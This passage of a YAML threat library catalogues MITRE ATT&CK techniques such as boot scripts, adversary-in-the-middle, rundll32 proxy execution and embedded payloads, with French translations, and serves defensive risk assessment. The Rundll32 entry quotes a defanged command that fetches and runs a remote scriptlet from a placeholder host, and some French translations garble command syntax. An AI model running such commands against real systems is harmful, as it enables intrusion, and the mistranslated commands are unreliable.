          \ code r\xE9fl\xE9chissant](https://attack.mitre.org/techniques/T1620) et\
          \ [Injection de processus](https://attack.mitre.org/techniques/T1055), le\
          \ stockage de donn\xE9es sans fichiers peut rester ind\xE9tect\xE9 par les\
          \ antivirus et autres outils de s\xE9curit\xE9 des terminaux qui ne peuvent\
          \ acc\xE9der qu'\xE0 des formats de fichiers sp\xE9cifiques depuis le stockage\
          \ disque. L'utilisation du stockage sans fichiers peut \xE9galement permettre\
          \ aux adversaires de contourner les protections offertes par les syst\xE8\
          mes de fichiers en lecture seule sous Linux. (Citation : Sysdig Fileless\
          \ Malware 23022)\n\nLes adversaires peuvent utiliser le stockage sans fichiers\
          \ pour dissimuler divers types de donn\xE9es stock\xE9es, y compris les\
          \ charges utiles/shellcode (potentiellement utilis\xE9s dans le cadre de\
          \ [Persistance](https://attack.mitre.org/tactics/TA0003)) et les donn\xE9\
          es collect\xE9es non encore exfiltr\xE9es de la victime (par exemple, [Local\
          \ Data Staging](https://attack.mitre.org/techniques/T1074/001)). Les adversaires\
          \ chiffrent, encodent, spinter ou obscurcissent \xE9galement souvent ces\
          \ donn\xE9es sans fichiers lorsqu'elles sont stock\xE9es. \n\nCertaines\
          \ formes d'activit\xE9 de stockage sans fichiers peuvent indirectement cr\xE9\
          er des artefacts dans le syst\xE8me de fichiers, mais dans des formats centraux\
          \ et autrement difficiles \xE0 inspecter comme les fichiers WMI (par exemple,\
          \ '\_%SystemRoot\_%\\System32\\Wbem\\Repository') ou le registre (par exemple,\
          \ '\_%SystemRoot\_%\\System32\\Config') Citation : Microsoft Fileless)https://attack.mitre.org/techniques/T1027/011"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1037
    ref_id: T1037
    name: Boot or Logon Initialization Scripts
    description: "Adversaries may use scripts automatically executed at boot or logon\
      \ initialization to establish persistence.(Citation: Mandiant APT29 Eye Spy\
      \ Email Nov 22)(Citation: Anomali Rocke March 2019) Initialization scripts can\
      \ be used to perform administrative functions, which may often execute other\
      \ programs or send information to an internal logging server. These scripts\
      \ can vary based on operating system and whether applied locally or remotely.\
      \  \n\nAdversaries may use these scripts to maintain persistence on a single\
      \ system. Depending on the access configuration of the logon scripts, either\
      \ local credentials or an administrator account may be necessary. \n\nAn adversary\
      \ may also be able to escalate their privileges since some boot or logon initialization\
      \ scripts run with higher privileges.\nhttps://attack.mitre.org/techniques/T1037"
    translations:
      fr:
        name: "Scripts d'initialisation de d\xE9marrage ou de connexion"
        description: "Les adversaires peuvent utiliser des scripts ex\xE9cut\xE9s\
          \ automatiquement au d\xE9marrage ou \xE0 l'initialisation de connexion\
          \ pour \xE9tablir la persistance. (Citation : Mandiant APT29 Eye Spy Email\
          \ 22 nov.)(Citation : Anomali Rocke mars 2019) Les scripts d'initialisation\
          \ peuvent \xEAtre utilis\xE9s pour effectuer des fonctions administratives,\
          \ qui peuvent souvent ex\xE9cuter d'autres programmes ou envoyer des informations\
          \ \xE0 un serveur de journalisation interne. Ces scripts peuvent varier\
          \ selon le syst\xE8me d'exploitation et s'ils sont appliqu\xE9s localement\
          \ ou \xE0 distance.  \n\nLes adversaires peuvent utiliser ces scripts pour\
          \ maintenir la persistance sur un seul syst\xE8me. Selon la configuration\
          \ d'acc\xE8s des scripts de connexion, des identifiants locaux ou un compte\
          \ administrateur peuvent \xEAtre n\xE9cessaires. \n\nUn adversaire peut\
          \ aussi \xEAtre capable d'escalader ses privil\xE8ges, car certains scripts\
          \ de d\xE9marrage ou d'initialisation de connexion fonctionnent avec des\
          \ privil\xE8ges sup\xE9rieurs.https\_://attack.mitre.org/techniques/T1037"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1557
    ref_id: T1557
    name: Adversary-in-the-Middle
    description: 'Adversaries may attempt to position themselves between two or more
      networked devices using an adversary-in-the-middle (AiTM) technique to support
      follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040),
      [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002),
      or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)).
      By abusing features of common networking protocols that can determine the flow
      of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device
      to communicate through an adversary controlled system so they can collect information
      or perform additional actions.(Citation: Rapid7 MiTM Basics)


      For example, adversaries may manipulate victim DNS settings to enable other
      malicious activities such as preventing/redirecting users from accessing legitimate
      sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation:
      ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their
      position in order to intercept user credentials, including access tokens ([Steal
      Application Access Token](https://attack.mitre.org/techniques/T1528)) and session
      cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation:
      volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s
      can also be used to establish an AiTM position, such as by negotiating a less
      secure, deprecated, or weaker version of communication protocol (SSL/TLS) or
      encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation:
      tlseminar_downgrade_att)


      Adversaries may also leverage the AiTM position to attempt to monitor and/or
      modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).
      Adversaries can setup a position similar to AiTM to prevent traffic from flowing
      to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562)
      and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).

      https://attack.mitre.org/techniques/T1557'
    translations:
      fr:
        name: Adversaire du milieu
        description: "Les adversaires peuvent tenter de se positionner entre deux\
          \ ou plusieurs dispositifs connect\xE9s en r\xE9seau en utilisant une technique\
          \ adversaire-in-the-middle (AiTM) pour soutenir des comportements ult\xE9\
          rieurs tels que [Reniflement r\xE9seau](https://attack.mitre.org/techniques/T1040),\
          \ [Manipulation de donn\xE9es transmises](https://attack.mitre.org/techniques/T1565/002)\
          \ ou des attaques \xE0 relecture ([Exploitation pour l'acc\xE8s aux accr\xE9\
          ditations](https://attack.mitre.org/techniques/T1212)). En abusant des fonctionnalit\xE9\
          s des protocoles r\xE9seau courants qui peuvent d\xE9terminer le flux du\
          \ trafic r\xE9seau (par exemple ARP, DNS, LLMNR, etc.), les adversaires\
          \ peuvent forcer un appareil \xE0 communiquer via un syst\xE8me contr\xF4\
          l\xE9 par l'adversaire afin de collecter des informations ou d'effectuer\
          \ des actions suppl\xE9mentaires. (Citation : Bases de Rapid7 MiTM)\n\n\
          Par exemple, les adversaires peuvent manipuler les param\xE8tres DNS des\
          \ victimes pour permettre d'autres activit\xE9s malveillantes, telles que\
          \ l'emp\xEAchement/redirection des utilisateurs d'acc\xE9der \xE0 des sites\
          \ l\xE9gitimes et/ou la diffusion de logiciels malveillants suppl\xE9mentaires.\
          \ (Citation : ttint_rat)(Citation : dns_changer_trojans)(Citation : ad_blocker_with_miner)\
          \ Les adversaires peuvent \xE9galement manipuler le DNS et exploiter leur\
          \ position pour intercepter les identifiants des utilisateurs, y compris\
          \ les jetons d'acc\xE8s ([Voler le jeton d'acc\xE8s \xE0 l'application](https://attack.mitre.org/techniques/T1528))\
          \ et les cookies de session ([Voler le cookie de session Web](https://attack.mitre.org/techniques/T1539)).\
          \ (Citation : volexity_0day_sophos_FW)(Citation : Tactiques symboliques)\
          \ [Attaque de r\xE9trogradation](https://attack.mitre.org/techniques/T1562/010)s\
          \ peuvent \xE9galement \xEAtre utilis\xE9s pour \xE9tablir une position\
          \ AiTM, par exemple en n\xE9gociant une version moins s\xE9curis\xE9e, obsol\xE8\
          te ou plus faible du protocole de communication (SSL/TLS) ou d'un algorithme\
          \ de chiffrement. (Citation : mitm_tls_downgrade_att)(Citation : taxonomy_downgrade_att_tls)(Citation\
          \ : tlseminar_downgrade_att)\n\nLes adversaires peuvent \xE9galement utiliser\
          \ la position AiTM pour tenter de surveiller et/ou modifier le trafic, comme\
          \ dans [Manipulation de donn\xE9es transmises](https://attack.mitre.org/techniques/T1565/002).\
          \ Les adversaires peuvent installer une position similaire \xE0 AiTM pour\
          \ emp\xEAcher le trafic de se diriger vers la destination appropri\xE9e,\
          \ potentiellement pour [Handicaper les d\xE9fenses](https://attack.mitre.org/techniques/T1562)\
          \ et/ou en soutien \xE0 un [d\xE9ni de service r\xE9seau](https://attack.mitre.org/techniques/T1498).https\_\
          ://attack.mitre.org/techniques/T1557"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1033
    ref_id: T1033
    name: System Owner/User Discovery
    description: 'Adversaries may attempt to identify the primary user, currently
      logged in user, set of users that commonly uses a system, or whether a user
      is actively using the system. They may do this, for example, by retrieving account
      usernames or by using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003).
      The information may be collected in a number of different ways using other Discovery
      techniques, because user and username details are prevalent throughout a system
      and include running process ownership, file/directory ownership, session information,
      and system logs. Adversaries may use the information from [System Owner/User
      Discovery](https://attack.mitre.org/techniques/T1033) during automated discovery
      to shape follow-on behaviors, including whether or not the adversary fully infects
      the target and/or attempts specific actions.


      Various utilities and commands may acquire this information, including <code>whoami</code>.
      In macOS and Linux, the currently logged in user can be identified with <code>w</code>
      and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v ''_''</code>
      command can also be used to enumerate user accounts. Environment variables,
      such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to
      access this information.


      On network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008)
      commands such as `show users` and `show ssh` can be used to display users currently
      logged into the device.(Citation: show_ssh_users_cmd_cisco)(Citation: US-CERT
      TA18-106A Network Infrastructure Devices 2018)

      https://attack.mitre.org/techniques/T1033'
    translations:
      fr:
        name: "D\xE9couverte du propri\xE9taire du syst\xE8me/utilisateur"
        description: "Les adversaires peuvent tenter d'identifier l'utilisateur principal,\
          \ l'utilisateur actuellement connect\xE9, l'ensemble d'utilisateurs qui\
          \ utilisent couramment un syst\xE8me, ou si un utilisateur utilise activement\
          \ le syst\xE8me. Ils peuvent le faire, par exemple, en r\xE9cup\xE9rant\
          \ les noms d'utilisateur des comptes ou en utilisant [OS Credential Dumping](https://attack.mitre.org/techniques/T1003).\
          \ Les informations peuvent \xEAtre collect\xE9es de diff\xE9rentes mani\xE8\
          res en utilisant d'autres techniques de d\xE9couverte, car les d\xE9tails\
          \ utilisateur et nom d'utilisateur sont pr\xE9dominants dans tout un syst\xE8\
          me et incluent la propri\xE9t\xE9 des processus en cours, la propri\xE9\
          t\xE9 des fichiers/r\xE9pertoires, les informations de session et les journaux\
          \ syst\xE8me. Les adversaires peuvent utiliser les informations de [Propri\xE9\
          taire du syst\xE8me/d\xE9couverte utilisateur](https://attack.mitre.org/techniques/T1033)\
          \ lors de la d\xE9couverte automatis\xE9e pour fa\xE7onner les comportements\
          \ suivants, y compris si l'adversaire infecte compl\xE8tement la cible et/ou\
          \ tente des actions sp\xE9cifiques.\n\nDivers utilitaires et commandes peuvent\
          \ acqu\xE9rir ces informations, notamment <code>whoami</code>. Dans macOS\
          \ et Linux, l'utilisateur actuellement connect\xE9 peut \xEAtre identifi\xE9\
          \ par <code>w</code> et <code>qui</code>. Sur macOS, le <code>dscl . liste\
          \ /Utilisateurs | La commande grep -v '_'</code> peut \xE9galement \xEA\
          tre utilis\xE9e pour \xE9num\xE9rer les comptes utilisateurs. Des variables\
          \ d'environnement, telles que <code>\_%USERNAME\_%</code> et <code>$USER</code>,\
          \ peuvent \xE9galement \xEAtre utilis\xE9es pour acc\xE9der \xE0 ces informations.\n\
          \nSur les appareils r\xE9seau, des commandes [CLI de l'appareil r\xE9seau](https://attack.mitre.org/techniques/T1059/008)\
          \ telles que \xAB montrer les utilisateurs \xBB et \xAB afficher ssh \xBB\
          \ peuvent \xEAtre utilis\xE9es pour afficher les utilisateurs actuellement\
          \ connect\xE9s \xE0 l'appareil. (Citation : show_ssh_users_cmd_cisco)(Citation\
          \ : US-CERT TA18-106A Dispositifs d'infrastructure r\xE9seau 2018)https://attack.mitre.org/techniques/T1033"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1583
    ref_id: T1583
    name: Acquire Infrastructure
    description: 'Adversaries may buy, lease, rent, or obtain infrastructure that
      can be used during targeting. A wide variety of infrastructure exists for hosting
      and orchestrating adversary operations. Infrastructure solutions include physical
      or cloud servers, domains, and third-party web services.(Citation: TrendmicroHideoutsLease)
      Some infrastructure providers offer free trial periods, enabling infrastructure
      acquisition at limited to no cost.(Citation: Free Trial PurpleUrchin) Additionally,
      botnets are available for rent or purchase.


      Use of these infrastructure solutions allows adversaries to stage, launch, and
      execute operations. Solutions may help adversary operations blend in with traffic
      that is seen as normal, such as contacting third-party web services or acquiring
      infrastructure to support [Proxy](https://attack.mitre.org/techniques/T1090),
      including from residential proxy services.(Citation: amnesty_nso_pegasus)(Citation:
      FBI Proxies Credential Stuffing)(Citation: Mandiant APT29 Microsoft 365 2022)
      Depending on the implementation, adversaries may use infrastructure that makes
      it difficult to physically tie back to them as well as utilize infrastructure
      that can be rapidly provisioned, modified, and shut down.

      https://attack.mitre.org/techniques/T1583'
    translations:
      fr:
        name: "Acqu\xE9rir des infrastructures"
        description: "Les adversaires peuvent acheter, louer, louer ou acqu\xE9rir\
          \ des infrastructures pouvant \xEAtre utilis\xE9es lors du ciblage. Une\
          \ grande vari\xE9t\xE9 d'infrastructures existe pour accueillir et orchestrer\
          \ les op\xE9rations adverses. Les solutions d'infrastructure incluent les\
          \ serveurs physiques ou cloud, les domaines et les services web tiers. (Citation\
          \ : TrendmicroHideoutsLease) Certains fournisseurs d'infrastructures proposent\
          \ des p\xE9riodes d'essai gratuites, permettant l'acquisition d'infrastructures\
          \ \xE0 des frais limit\xE9s ou gratuits. (Citation : Essai gratuit PurpleUrchin)\
          \ De plus, des botnets sont disponibles \xE0 la location ou \xE0 l'achat.\n\
          \nL'utilisation de ces solutions d'infrastructure permet aux adversaires\
          \ de mettre en place, de lancer et d'ex\xE9cuter des op\xE9rations. Les\
          \ solutions peuvent aider les op\xE9rations adverses \xE0 s'int\xE9grer\
          \ au trafic consid\xE9r\xE9 comme normal, comme contacter des services web\
          \ tiers ou acqu\xE9rir une infrastructure pour supporter [Proxy](https://attack.mitre.org/techniques/T1090),\
          \ y compris \xE0 partir de services proxy r\xE9sidentiels. (Citation : amnesty_nso_pegasus)(Citation\
          \ : Bourrage de cr\xE9dentiels de mandataires du FBI)(Citation : Mandiant\
          \ APT29 Microsoft 365 2022) Selon la mise en \u0153uvre, les adversaires\
          \ peuvent utiliser des infrastructures qui rendent difficile la connexion\
          \ physique \xE0 eux, ainsi que des infrastructures pouvant \xEAtre rapidement\
          \ provisionn\xE9es, modifi\xE9es et d\xE9sactiv\xE9es.https\_://attack.mitre.org/techniques/T1583"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1218.011
    ref_id: T1218.011
    name: Rundll32
    description: 'Adversaries may abuse rundll32.exe to proxy execution of malicious
      code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)),
      may avoid triggering security tools that may not monitor execution of the rundll32.exe
      process because of allowlists or false positives from normal operations. Rundll32.exe
      is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname,
      DLLfunction}</code>).


      Rundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002)
      Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code>
      and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes
      rundll32.exe to execute.(Citation: Trend Micro CPL) For example, [ClickOnce](https://attack.mitre.org/techniques/T1127/002)
      can be proxied through Rundll32.exe.


      Rundll32 can also be used to execute scripts such as JavaScript. This can be
      done using a syntax similar to this: <code>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication
      ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"</code>  This
      behavior has been seen used by malware such as Poweliks.(Citation: This is Security
      Command Line Confusion)


      Threat actors may also abuse legitimate, signed system DLLs (e.g., <code>zipfldr.dll,
      ieframe.dll</code>) with <code>rundll32.exe</code> to execute malicious programs
      or scripts indirectly, making their activity appear more legitimate and evading
      detection.(Citation: lolbas project Zipfldr.dll)(Citation: lolbas project Ieframe.dll)


      Adversaries may also attempt to obscure malicious code from analysis by abusing
      the manner in which rundll32.exe loads DLL function names. As part of Windows
      compatibility support for various character sets, rundll32.exe will first check
      for wide/Unicode then ANSI character-supported functions before loading the
      specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll,
      ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>,
      or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>).
      Adversaries may therefore obscure malicious code by creating multiple identical
      exported function names and appending <code>W</code> and/or <code>A</code> to
      harmless ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github
      NoRunDll) DLL functions can also be exported and executed by an ordinal number
      (ex: <code>rundll32.exe file.dll,#1</code>).


      Additionally, adversaries may use [Masquerading](https://attack.mitre.org/techniques/T1036)
      techniques (such as changing DLL file names, file extensions, or function names)
      to further conceal execution of a malicious payload.(Citation: rundll32.exe
      defense evasion)

      https://attack.mitre.org/techniques/T1218/011'
    translations:
      fr:
        name: Rundll32
        description: "Les adversaires peuvent abuser rundll32.exe pour ex\xE9cuter\
          \ par procuration de code malveillant. Utiliser rundll32.exe, l'ex\xE9cution\
          \ directe (c'est-\xE0-dire [Shared Modules](https://attack.mitre.org/techniques/T1129))\
          \ peut \xE9viter de d\xE9clencher des outils de s\xE9curit\xE9 qui ne surveillent\
          \ pas l'ex\xE9cution du processus rundll32.exe en raison des listes de permis\
          \ ou des faux positifs issus d'op\xE9rations normales. Rundll32.exe est\
          \ couramment associ\xE9 \xE0 l'ex\xE9cution de charges utiles DLL (ex :\
          \ <code>rundll32.exe {DLLname, DLLfunction}</code>).\n\nRundll32.exe peuvent\
          \ \xE9galement \xEAtre utilis\xE9s pour ex\xE9cuter des fichiers d'\xE9\
          l\xE9ments du [Panneau de configuration](https://attack.mitre.org/techniques/T1218/002)\
          \ (.cpl) via les fonctions shell32.dll non document\xE9es <code>Control_RunDLL</code>\
          \ et <code>Control_RunDLLAsUser</code>. Double-cliquer sur un fichier .cpl\
          \ provoque \xE9galement l'ex\xE9cution de rundll32.exe. (Citation : Trend\
          \ Micro CPL) Par exemple, [ClickOnce](https://attack.mitre.org/techniques/T1127/002)\
          \ peut \xEAtre proxy\xE9 via Rundll32.exe.\n\nRundll32 peut \xE9galement\
          \ \xEAtre utilis\xE9 pour ex\xE9cuter des scripts tels que JavaScript. Cela\
          \ peut se faire avec une syntaxe similaire \xE0 celle-ci : <code>rundll32.exe\
          \ javascript :\"\\.. \\mshtml,RunHTMLApplication \xBB ; document.write()\_\
          ; GetObject(\"script\_:https[\_:]//www[.]Exemple[.]com/malicious.sct\_\xBB\
          )\"</code> Ce comportement a \xE9t\xE9 observ\xE9 par des logiciels malveillants\
          \ tels que Poweliks. (Citation : Ceci est la confusion de la ligne de commande\
          \ de s\xE9curit\xE9)\n\nLes acteurs malveillants peuvent \xE9galement abuser\
          \ de DLL syst\xE8me l\xE9gitimes et sign\xE9s (par exemple, <code>zipfldr.dll,\
          \ ieframe.dll</code>) avec <code>rundll32.exe</code> pour ex\xE9cuter indirectement\
          \ des programmes ou scripts malveillants, rendant leur activit\xE9 plus\
          \ l\xE9gitime et \xE9chappant \xE0 la d\xE9tection. (Citation : lolbas project\
          \ Zipfldr.dll)(Citation : lolbas project Ieframe.dll)\n\nLes adversaires\
          \ peuvent \xE9galement tenter d'occulter le code malveillant \xE0 l'analyse\
          \ en abusant de la mani\xE8re dont rundll32.exe charge les noms de fonctions\
          \ DLL. Dans le cadre du support de compatibilit\xE9 Windows pour divers\
          \ ensembles de caract\xE8res, rundll32.exe v\xE9rifiera d'abord les fonctions\
          \ larges/Unicode puis ANSI avant de charger la fonction sp\xE9cifi\xE9e\
          \ (par exemple, avec la commande <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>,\
          \ rundll32.exe commencera par tenter d'ex\xE9cuter <code>ExampleFunctionW</code>,\
          \ ou en cas d'\xE9chec \xE0 ce <code>ExampleFunctionA</code>,  avant de\
          \ charger <code>ExampleFunction</code>). Les adversaires peuvent donc masquer\
          \ le code malveillant en cr\xE9ant plusieurs noms de fonctions export\xE9\
          es identiques et en ajoutant <code>W</code> et/ou <code>A</code> \xE0 des\
          \ noms de fonctions inoffensifs. (Citation : Attaquer Rundll32.exe obscurit\xE9\
          )(Citation : Github NoRunDll) Les fonctions DLL peuvent \xE9galement \xEA\
          tre export\xE9es et ex\xE9cut\xE9es par un nombre ordinal (ex : <code>rundll32.exe\
          \ file.dll,#1</code>).\n\nDe plus, les adversaires peuvent utiliser des\
          \ techniques de [Masquerad](https://attack.mitre.org/techniques/T1036) (telles\
          \ que changer les noms de fichiers DLL, les extensions de fichiers ou les\
          \ noms de fonctions) pour dissimuler davantage l'ex\xE9cution d'une charge\
          \ utile malveillante. (Citation : rundll32.exe \xE9vasion de la d\xE9fense)https://attack.mitre.org/techniques/T1218/011"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1613
    ref_id: T1613
    name: Container and Resource Discovery
    description: "Adversaries may attempt to discover containers and other resources\
      \ that are available within a containers environment. Other resources may include\
      \ images, deployments, pods, nodes, and other information such as the status\
      \ of a cluster.\n\nThese resources can be viewed within web applications such\
      \ as the Kubernetes dashboard or can be queried via the Docker and Kubernetes\
      \ APIs.(Citation: Docker API)(Citation: Kubernetes API) In Docker, logs may\
      \ leak information about the environment, such as the environment\u2019s configuration,\
      \ which services are available, and what cloud provider the victim may be utilizing.\
      \ The discovery of these resources may inform an adversary\u2019s next steps\
      \ in the environment, such as how to perform lateral movement and which methods\
      \ to utilize for execution.\nhttps://attack.mitre.org/techniques/T1613"
    translations:
      fr:
        name: "D\xE9couverte de conteneurs et de ressources"
        description: "Les adversaires peuvent tenter de d\xE9couvrir des conteneurs\
          \ et d'autres ressources disponibles dans un environnement de conteneurs.\
          \ D'autres ressources peuvent inclure des images, des d\xE9ploiements, des\
          \ pods, des n\u0153uds et d'autres informations telles que l'\xE9tat d'un\
          \ cluster.\n\nCes ressources peuvent \xEAtre consult\xE9es dans des applications\
          \ web telles que le tableau de bord Kubernetes ou interrog\xE9es via les\
          \ API Docker et Kubernetes. (Citation : API Docker)(Citation : API Kubernetes)\
          \ Dans Docker, les journaux peuvent divulguer des informations sur l'environnement,\
          \ telles que la configuration de l'environnement, les services disponibles\
          \ et le fournisseur cloud que la victime peut utiliser. La d\xE9couverte\
          \ de ces ressources peut orienter les prochaines \xE9tapes de l'adversaire\
          \ dans l'environnement, comme la mani\xE8re d'effectuer un mouvement lat\xE9\
          ral et les m\xE9thodes \xE0 utiliser pour l'ex\xE9cution.https\_://attack.mitre.org/techniques/T1613"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1583.007
    ref_id: T1583.007
    name: Serverless
    description: 'Adversaries may purchase and configure serverless cloud infrastructure,
      such as Cloudflare Workers, AWS Lambda functions, or Google Apps Scripts, that
      can be used during targeting. By utilizing serverless infrastructure, adversaries
      can make it more difficult to attribute infrastructure used during operations
      back to them.


      Once acquired, the serverless runtime environment can be leveraged to either
      respond directly to infected machines or to [Proxy](https://attack.mitre.org/techniques/T1090)
      traffic to an adversary-owned command and control server.(Citation: BlackWater
      Malware Cloudflare Workers)(Citation: AWS Lambda Redirector)(Citation: GWS Apps
      Script Abuse 2021) As traffic generated by these functions will appear to come
      from subdomains of common cloud providers, it may be difficult to distinguish
      from ordinary traffic to these providers - making it easier to [Hide Infrastructure](https://attack.mitre.org/techniques/T1665).(Citation:
      Detecting Command & Control in the Cloud)(Citation: BlackWater Malware Cloudflare
      Workers)

      https://attack.mitre.org/techniques/T1583/007'
    translations:
      fr:
        name: Serverless
        description: "Les adversaires peuvent acheter et configurer des infrastructures\
          \ cloud serverless, telles que Cloudflare Workers, AWS Lambda functions\
          \ ou Google Apps Scripts, qui peuvent \xEAtre utilis\xE9es lors du ciblage.\
          \ En utilisant une infrastructure serverless, les adversaires peuvent rendre\
          \ plus difficile l'attribution des infrastructures utilis\xE9es pendant\
          \ les op\xE9rations.\n\nUne fois acquis, l'environnement d'ex\xE9cution\
          \ sans serveur peut \xEAtre exploit\xE9 pour r\xE9pondre directement aux\
          \ machines infect\xE9es ou au trafic [proxy](https://attack.mitre.org/techniques/T1090)\
          \ vers un serveur de commande et de contr\xF4le appartenant \xE0 l'adversaire.\
          \ (Citation : Travailleurs de Cloudflare du malware Blackwater)(Citation\
          \ : Redirecteur AWS Lambda)(Citation : Abus de script des applications GWS\
          \ 2021) Comme le trafic g\xE9n\xE9r\xE9 par ces fonctions semblera provenir\
          \ de sous-domaines de fournisseurs cloud courants, il peut \xEAtre difficile\
          \ de distinguer le trafic ordinaire vers ces fournisseurs \u2013 ce qui\
          \ facilite la mise en place de [Masquer l'infrastructure](https://attack.mitre.org/techniques/T1665).\
          \ (Citation : D\xE9tection du commandement et du contr\xF4le dans le cloud)(Citation\
          \ : Travailleurs du logiciel malveillant BlackWater Cloudflare) https://attack.mitre.org/techniques/T1583/007"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1132.001
    ref_id: T1132.001
    name: Standard Encoding
    description: 'Adversaries may encode data with a standard data encoding system
      to make the content of command and control traffic more difficult to detect.
      Command and control (C2) information can be encoded using a standard data encoding
      system that adheres to existing protocol specifications. Common data encoding
      schemes include ASCII, Unicode, hexadecimal, Base64, and MIME.(Citation: Wikipedia
      Binary-to-text Encoding)(Citation: Wikipedia Character Encoding) Some data encoding
      systems may also result in data compression, such as gzip.

      https://attack.mitre.org/techniques/T1132/001'
    translations:
      fr:
        name: Encodage standard
        description: "Les adversaires peuvent encoder les donn\xE9es avec un syst\xE8\
          me standard de codage pour rendre le contenu du trafic de commandement et\
          \ de contr\xF4le plus difficile \xE0 d\xE9tecter. Les informations de commande\
          \ et de contr\xF4le (C2) peuvent \xEAtre encod\xE9es \xE0 l'aide d'un syst\xE8\
          me standard de codage de donn\xE9es qui respecte les sp\xE9cifications de\
          \ protocole existantes. Les sch\xE9mas de codage de donn\xE9es courants\
          \ incluent ASCII, Unicode, hexad\xE9cimal, Base64 et MIME. (Citation : Encodage\
          \ binaire-texte Wikip\xE9dia)(Citation : Encodage de caract\xE8res Wikip\xE9\
          dia) Certains syst\xE8mes d'encodage de donn\xE9es peuvent \xE9galement\
          \ entra\xEEner une compression des donn\xE9es, comme gzip.https\_://attack.mitre.org/techniques/T1132/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1027.009
    ref_id: T1027.009
    name: Embedded Payloads
    description: "Adversaries may embed payloads within other files to conceal malicious\
      \ content from defenses. Otherwise seemingly benign files (such as scripts and\
      \ executables) may be abused to carry and obfuscate malicious payloads and content.\
      \ In some cases, embedded payloads may also enable adversaries to [Subvert Trust\
      \ Controls](https://attack.mitre.org/techniques/T1553) by not impacting execution\
      \ controls such as digital signatures and notarization tickets.(Citation: Sentinel\
      \ Labs) \n\nAdversaries may embed payloads in various file formats to hide payloads.(Citation:\
      \ Microsoft Learn) This is similar to [Steganography](https://attack.mitre.org/techniques/T1027/003),\
      \ though does not involve weaving malicious content into specific bytes and\
      \ patterns related to legitimate digital media formats.(Citation: GitHub PSImage)\
      \ \n\nFor example, adversaries have been observed embedding payloads within\
      \ or as an overlay of an otherwise benign binary.(Citation: Securelist Dtrack2)\
      \ Adversaries have also been observed nesting payloads (such as executables\
      \ and run-only scripts) inside a file of the same format.(Citation: SentinelLabs\
      \ reversing run-only applescripts 2021) \n\nEmbedded content may also be used\
      \ as [Process Injection](https://attack.mitre.org/techniques/T1055) payloads\
      \ used to infect benign system processes.(Citation: Trend Micro) These embedded\
      \ then injected payloads may be used as part of the modules of malware designed\
      \ to provide specific features such as encrypting C2 communications in support\
      \ of an orchestrator module. For example, an embedded module may be injected\
      \ into default browsers, allowing adversaries to then communicate via the network.(Citation:\
      \ Malware Analysis Report ComRAT)\nhttps://attack.mitre.org/techniques/T1027/009"
    translations:
      fr:
        name: "Charges utiles embarqu\xE9es"
        description: "Les adversaires peuvent int\xE9grer des charges utiles dans\
          \ d'autres fichiers pour dissimuler un contenu malveillant aux d\xE9fenses.\
          \ Des fichiers apparemment inoffensifs (tels que des scripts et ex\xE9cutables)\
          \ peuvent \xEAtre abus\xE9s pour transporter et obscurcir des charges utiles\
          \ et contenus malveillants. Dans certains cas, les charges utiles int\xE9\
          gr\xE9es peuvent \xE9galement permettre aux adversaires de [Subvertir les\
          \ contr\xF4les de confiance](https://attack.mitre.org/techniques/T1553)\
          \ en n'affectant pas les contr\xF4les d'ex\xE9cution tels que les signatures\
          \ num\xE9riques et les tickets de notarisation. (Citation : Laboratoires\
          \ Sentinelles) \n\nLes adversaires peuvent int\xE9grer des charges utiles\
          \ dans diff\xE9rents formats de fichiers pour dissimuler les charges utiles.\
          \ (Citation : Microsoft Learn) Cela est similaire \xE0 [St\xE9ganographie](https://attack.mitre.org/techniques/T1027/003),\
          \ bien qu'il n'implique pas de tisser du contenu malveillant dans des octets\
          \ et des motifs sp\xE9cifiques li\xE9s \xE0 des formats num\xE9riques l\xE9\
          gitimes. (Citation : GitHub PSImage) \n\nPar exemple, des adversaires ont\
          \ \xE9t\xE9 observ\xE9s en train d'int\xE9grer des charges utiles dans ou\
          \ en superposition \xE0 un binaire autrement b\xE9nin. (Citation : Securelist\
          \ Dtrack2) Des adversaires ont \xE9galement \xE9t\xE9 observ\xE9s en train\
          \ d'imbriquer des charges utiles (telles que des ex\xE9cutables et des scripts\
          \ d'ex\xE9cution uniquement) \xE0 l'int\xE9rieur d'un fichier du m\xEAme\
